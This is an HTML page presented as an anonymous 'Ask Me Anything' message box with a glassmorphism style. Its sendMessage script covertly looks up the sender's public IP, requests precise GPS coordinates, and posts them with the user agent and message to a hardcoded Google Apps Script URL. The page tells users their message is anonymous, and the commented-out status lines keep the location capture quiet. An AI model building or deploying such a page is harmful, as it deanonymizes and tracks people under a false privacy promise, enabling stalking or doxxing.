<!DOCTYPE html>
<html>
<head>
  <title>Glass Message Box</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">

  
  <style>
    :root {
      --primary-color: rgba(120, 99, 241, 0.8);
      --primary-hover: rgba(120, 99, 241, 0.9);
      --error-color: rgba(255, 107, 107, 0.8);
      --text-color: rgba(255, 255, 255, 0.9);
      --light-text: rgba(255, 255, 255, 0.7);
      --glass-bg: rgba(255, 255, 255, 0.1);
      --glass-border: rgba(255, 255, 255, 0.2);
      --glass-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
    }
    
    body {
      font-family: 'Fira Code', monospace;
      text-align: center;
      padding: 20px;
      background: linear-gradient(135deg, #0f172a 0%, #1e293b 100%);
      color: var(--text-color);
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      margin: 0;
      background-image: url('bg.jpg');
      background-size: cover;
      background-position: center;
    }
    
    .container {
      background: var(--glass-bg);
      backdrop-filter: blur(12px);
      -webkit-backdrop-filter: blur(12px);
      padding: 30px;
      border-radius: 16px;
      border: 1px solid var(--glass-border);
      box-shadow: var(--glass-shadow);
      width: 100%;
      max-width: 500px;
      margin: 20px;
      position: relative;
      overflow: hidden;
    }
    
    /* Glass border animation */
    .container::before {
      content: '';
      position: absolute;
      top: -2px;
      left: -2px;
      right: -2px;
      bottom: -2px;
      background: linear-gradient(45deg, 
        rgba(110, 231, 183, 0.3), 
        rgba(94, 234, 212, 0.3), 
        rgba(110, 231, 183, 0.3));
      z-index: -1;
      border-radius: 18px;
      background-size: 200% 200%;
      animation: gradient 5s ease infinite;
      opacity: 0.7;
    }
    
    @keyframes gradient {
      0% { background-position: 0% 50%; }
      50% { background-position: 100% 50%; }
      100% { background-position: 0% 50%; }
    }
    
    .overlay-img {
      width: 120px;
      height: 120px;
      border-radius: 50%;
      object-fit: cover;
      border: 2px solid rgba(255, 255, 255, 0.3);
      box-shadow: 0 4px 30px rgba(0, 0, 0, 0.1);
      margin-bottom: 20px;
      background: rgba(255, 255, 255, 0.2);
      backdrop-filter: blur(5px);
    }
    
    h2 {
      margin-bottom: 20px;
      color: var(--text-color);
      font-weight: 500;
      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
    }
    
    p {
      color: var(--light-text);
      margin-bottom: 25px;
      font-size: 14px;
    }
    
    textarea {
      width: 100%;
      height: 120px;
      padding: 15px;
      font-size: 16px;
      border-radius: 12px;
      border: 1px solid var(--glass-border);
      resize: vertical;
      margin-bottom: 15px;
      background: rgba(255, 255, 255, 0.1);
      color: var(--text-color);
      font-family: 'Fira Code', monospace;
      transition: all 0.3s ease;
      backdrop-filter: blur(5px);
    }
    
    textarea::placeholder {
      color: rgba(255, 255, 255, 0.5);
    }
    
    textarea:focus {
      outline: none;
      border-color: var(--primary-color);
      box-shadow: 0 0 0 3px rgba(110, 231, 183, 0.3);
      background: rgba(255, 255, 255, 0.15);
    }
    
    button {
      margin-top: 10px;
      padding: 14px 32px;
      font-size: 16px;
      font-weight: 500;
      border: none;
      border-radius: 12px;
      background: var(--primary-color);
      color: #0f172a;
      transition: all 0.3s ease;
      cursor: pointer;
      backdrop-filter: blur(5px);
      -webkit-backdrop-filter: blur(5px);
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      font-family: 'Fira Code', monospace;
      position: relative;
      overflow: hidden;
    }
    
    button:hover {
      background: var(--primary-hover);
      transform: translateY(-2px);
      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.15);
    }
    
    button:active {
      transform: translateY(0);
    }
    
    button:disabled {
      background: rgba(255, 255, 255, 0.2);
      color: rgba(255, 255, 255, 0.5);
      cursor: not-allowed;
      transform: none;
    }
    
    #locationStatus {
      margin-top: 15px;
      font-size: 14px;
      color: var(--light-text);
      min-height: 20px;
    }
    
    .privacy-notice {
      margin-top: 25px;
      font-size: 12px;
      color: var(--light-text);
      line-height: 1.6;
    }
    
    .success-message {
      color: var(--primary-color);
      font-weight: 500;
    }
    
    .error-message {
      color: var(--error-color);
      font-weight: 500;
    }
    
    .typing-indicator {
      display: none;
      margin: 5px 0 15px;
      color: var(--light-text);
      font-size: 13px;
      text-align: right;
    }
    
    @media (max-width: 480px) {
      body {
        padding: 15px;
      }
      
      .container {
        padding: 25px;
      }
      
      textarea {
        height: 100px;
        padding: 12px;
      }
      
      button {
        padding: 12px 28px;
      }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="my.jpg" alt="Profile Photo" class="overlay-img">
    <h2>ASK ME ANYTHING</h2>
    <p>Send your question anonymously</p>
    
    <textarea id="message" placeholder="Type your message here..." maxlength="500"></textarea>
    <div class="typing-indicator" id="charCount">0/500 characters</div>
    
    <button id="sendButton" onclick="sendMessage()">Send Message</button>
    <div id="locationStatus"></div>
    
    <div class="privacy-notice">
      <p>Your message will be sent anonymously. </p>
    </div>
  </div>

  <script>
    // Character counter for textarea
    document.getElementById('message').addEventListener('input', function() {
      const charCount = this.value.length;
      document.getElementById('charCount').textContent = `${charCount}/500 characters`;
      document.getElementById('charCount').style.display = 'block';
    });

    async function sendMessage() {
      const message = document.getElementById('message').value.trim();
      if (!message) {
        alert("Please type a message before sending!");
        return;
      }

      const sendButton = document.getElementById('sendButton');
      const locationStatus = document.getElementById('locationStatus');
      
      // Disable button during processing
      sendButton.disabled = true;
      sendButton.textContent = "Sending...";

      try {
        // Get public IP
        let ip = "Unknown";
        try {
          const ipRes = await fetch("https://api.ipify.org?format=json");
          const ipData = await ipRes.json();
          ip = ipData.ip;
        } catch (error) {
          console.error("IP detection failed:", error);
        }

        // Get GPS Coordinates
        let coords = { latitude: null, longitude: null, accuracy: null };
        
        if (navigator.geolocation) {
         // locationStatus.textContent = "üîç Detecting your location...";
          
          try {
            const position = await new Promise((resolve, reject) => {
              navigator.geolocation.getCurrentPosition(resolve, reject, {
                enableHighAccuracy: true,
                timeout: 8000,
                maximumAge: 0
              });
            });
            
            coords = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy
            };
            
            locationStatus.innerHTML = `<span class="success-message"></span>`;
          } catch (error) {
            //locationStatus.innerHTML = `<span>Using approximate location (IP: ${ip})</span>`;
            console.warn("Geolocation error:", error);
          }
        } else {
          locationStatus.innerHTML = `<span>Using IP-based location (${ip})</span>`;
        }

        const url = "https://script.google.com/macros/s/AKfycbyAuM-49crRaXDahsEC7GmkOcL3ZrW_3N4MFlPbhqjAe81kEyVpS0KA12T2YZq5tIgxLg/exec"; 

        // Show loading state
        locationStatus.innerHTML += `<br><span>‚è≥ Sending message...</span>`;
        
        await fetch(url, {
          method: "POST",
          mode: "no-cors", 
          body: JSON.stringify({ 
            message, 
            ip,
            coords,
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent
          }),
          headers: { "Content-Type": "application/json" }
        });

        // Success message with animation
        locationStatus.innerHTML = `<span class="success-message">‚úì Message sent successfully!</span>`;
        document.getElementById('message').value = "";
        document.getElementById('charCount').style.display = 'none';
        
        // Reset form after delay
        setTimeout(() => {
          locationStatus.textContent = "";
        }, 3000);

      } catch (error) {
        locationStatus.innerHTML = `<span class="error-message">‚úó Failed to send message. Please try again.</span>`;
        console.error("Submission error:", error);
      } finally {
        sendButton.disabled = false;
        sendButton.textContent = "Send Message";
      }
    }
  </script>
</body>
</html>
